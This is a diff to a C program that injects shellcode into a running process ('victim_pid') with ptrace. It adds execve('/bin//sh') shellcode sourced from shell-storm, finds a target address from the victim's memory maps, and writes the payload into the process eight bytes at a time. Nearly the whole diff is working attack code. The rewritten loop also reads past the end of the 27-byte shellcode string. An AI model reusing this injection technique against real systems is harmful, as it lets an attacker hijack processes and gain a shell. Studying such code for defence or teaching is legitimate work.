@@ -3,12 +3,21 @@
 #include <limits.h>
 #include <stdlib.h>
 #include <string.h>
+#include <stdint.h>
 #include <sys/user.h>
 #include <sys/wait.h>
 #include <sys/ptrace.h>
 
 #define PID_MAX 32768
 #define PID_MAX_STR_LENGTH 64
+
+
+// http://shell-storm.org/shellcode/files/shellcode-806.php
+const char *SHELLCODE = "\x31\xc0\x48\xbb\xd1\x9d\x96"
+                        "\x91\xd0\x8c\x97\xff\x48\xf7"
+                        "\xdb\x53\x54\x5f\x99\x52\x57"
+                        "\x54\x5e\xb0\x3b\x0f\x05";
+
 
 int get_proc_pid_max() {
     FILE *pid_max_file = fopen("/proc/sys/kernel/pid_max", "r");
@@ -171,28 +180,13 @@ int main(int argc, const char *argv[]) {
     }
 
     long address = parse_maps_file(victim_pid);
+    
+    size_t payload_size = strlen(SHELLCODE);
+    uint64_t *payload = (uint64_t *)SHELLCODE;
 
-    // http://shell-storm.org/shellcode/files/shellcode-806.php
-    char shellcode[] =  "\x31\xc0\x48\xbb\xd1\x9d\x96"
-                        "\x91\xd0\x8c\x97\xff\x48\xf7"
-                        "\xdb\x53\x54\x5f\x99\x52\x57"
-                        "\x54\x5e\xb0\x3b\x0f\x05";
-    
-    size_t payload_size = strlen(shellcode);
-    char old_memory[payload_size];
-    memset(old_memory, 0, payload_size);
-    
     fprintf(stdout, "[*] Injecting payload at address 0x%lx.\n", address);
-    for (size_t i = 0; i < payload_size; i++) {
-        errno = 0;
-        if (ptrace(PTRACE_PEEKTEXT, victim_pid, address + i, old_memory[i]) < 0 
-                && errno != 0) {
-
-            fprintf(stderr, "Failed to PTRACE_PEEKTEXT: %s\n", strerror(errno));
-            exit(EXIT_FAILURE);
-        }
-
-        if (ptrace(PTRACE_POKETEXT, victim_pid, address + i, shellcode[i]) < 0) {
+    for (size_t i = 0; i < payload_size; i += 8, payload++) {
+        if (ptrace(PTRACE_POKETEXT, victim_pid, address + i, *payload) < 0) {
             fprintf(stderr, "Failed to PTRACE_POKETEXT: %s\n", strerror(errno));
             exit(EXIT_FAILURE);
         }
